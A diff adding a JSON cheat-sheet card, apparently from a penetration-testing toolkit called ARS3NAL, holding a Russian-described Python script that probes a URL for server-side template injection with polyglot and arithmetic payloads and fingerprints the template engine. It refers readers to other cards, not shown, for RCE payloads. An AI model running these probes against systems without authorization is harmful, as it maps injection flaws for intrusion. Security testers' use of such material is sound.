@@ -1,0 +1,22 @@
+{
+  "category": "SSTI",
+  "group": "exploit",
+  "catOrder": 13,
+  "entries": [
+    {
+      "title": "SSTI detector (polyglot + arithmetic + engine fingerprint)",
+      "lang": "python",
+      "tags": [
+        "ssti",
+        "detect",
+        "fingerprint"
+      ],
+      "rating": "must",
+      "deps": "pip install requests",
+      "placeholders": "{{URL}} (точка инъекции = *) · {{PARAM}}",
+      "source": "https://portswigger.net/research/server-side-template-injection",
+      "license": "GPL-3.0 (оригинал)",
+      "body": "Ищет server-side template injection в три прохода. Сначала шлёт **полиглот** `${{<%[%'\\\"}}%\\` (ломает синтаксис любого движка и провоцирует ошибку/отражение). Потом подставляет **арифметику со случайными множителями** вроде `{{7*'7'}}` и `${7*7}`: если в ответе появилось вычисленное произведение, а не сам текст payload, шаблон точно исполняет ввод. Третий проход по разнице между синтаксисами разных движков (`{{7*7}}` против `${7*7}` против `#{7*7}` против `{7*7}`) сужает движок до Jinja2/Twig/Freemarker/Velocity/Smarty/Mako/ERB/EJS. Множители случайные, чтобы не спутать совпадение с обычным числом на странице.\n\n> Это только **детектор**: он не выполняет команды, а лишь подтверждает факт и угадывает движок. RCE-payload бери из карточек ниже под конкретный движок. Точку инъекции помечай `*` в URL или передавай имя POST-параметра через `--where`.\n\n```python\n#!/usr/bin/env python3\n# ssti_detect.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\nimport argparse, random, requests\nrequests.packages.urllib3.disable_warnings()\n\nPOLYGLOT = \"${{<%[%'\\\"}}%\\\\\"\n\n# (name, syntax-template, reverse-priority hint)\nPROBES = [\n    (\"jinja2/twig/smarty(curly)\", \"{{{{{a}*{b}}}}}\"),\n    (\"freemarker/velocity/spel($)\", \"${{{a}*{b}}}\"),\n    (\"thymeleaf/jsp-el(#)\",        \"#{{{a}*{b}}}\"),\n    (\"smarty/mako(single)\",        \"{{{a}*{b}}}\"),\n    (\"erb/ejs(<%=)\",               \"<%= {a}*{b} %>\"),\n]\n\nFINGERPRINT = [\n    (\"{{7*'7'}}\", \"7777777\", \"Jinja2 (Python)\"),\n    (\"{{7*'7'}}\", \"49\",      \"Twig (PHP)\"),\n    (\"${7*7}\",    \"49\",      \"Freemarker / Velocity / SpEL (Java)\"),\n    (\"#{7*7}\",    \"49\",      \"Ruby ERB / Thymeleaf\"),\n    (\"{7*7}\",     \"49\",      \"Smarty / Mako\"),\n]\n\ndef send(s, a, payload):\n    full = a.url.replace(\"*\", payload) if \"*\" in a.url else a.url\n    ck = dict(c.split(\"=\", 1) for c in a.cookie.split(\";\") if \"=\" in c) if a.cookie else None\n    try:\n        if a.where == \"GET\":\n            r = s.get(full, cookies=ck, verify=False, timeout=20)\n        else:\n            r = s.post(a.url, data={a.where: payload}, cookies=ck, verify=False, timeout=20)\n        return r.text\n    except requests.RequestException:\n        return \"\"\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"ARS3NAL SSTI detector\")\n    ap.add_argument(\"-u\", \"--url\", required=True, help=\"URL with * at the injection point\")\n    ap.add_argument(\"--where\", default=\"GET\", help=\"GET or a POST param name\")\n    ap.add_argument(\"-c\", \"--cookie\", default=\"\")\n    a = ap.parse_args()\n    s = requests.Session(); s.headers[\"User-Agent\"] = \"ARS3NAL-SSTI/1.0\"\n\n    # pass 1: polyglot breaks syntax (error / odd reflection)\n    body = send(s, a, POLYGLOT)\n    if POLYGLOT not in body:\n        print(\"[~] polyglot mangled (template likely parsed it) - good sign\")\n\n    # pass 2: random-factor arithmetic\n    hit = False\n    for name, tmpl in PROBES:\n        x, y = random.randint(40, 99), random.randint(40, 99)\n        want = str(x * y)\n        payload = tmpl.format(a=x, b=y)\n        if want in send(s, a, payload):\n            print(f\"[+] EVALUATED  {payload!r} -> {want}  (syntax group: {name})\")\n            hit = True\n    if not hit:\n        print(\"[-] no arithmetic evaluated - SSTI not confirmed\")\n        return\n\n    # pass 3: engine fingerprint\n    print(\"[*] fingerprinting engine ...\")\n    for payload, marker, engine in FINGERPRINT:\n        if marker in send(s, a, payload):\n            print(f\"    [=] {payload!r} -> {marker!r}  ==> {engine}\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\nЗапуск:\n```bash\npython3 ssti_detect.py -u \"https://target/page?name=*\"\npython3 ssti_detect.py -u \"https://target/profile\" --where bio -c \"session=abc\"\n```"
+    }
+  ]
+}
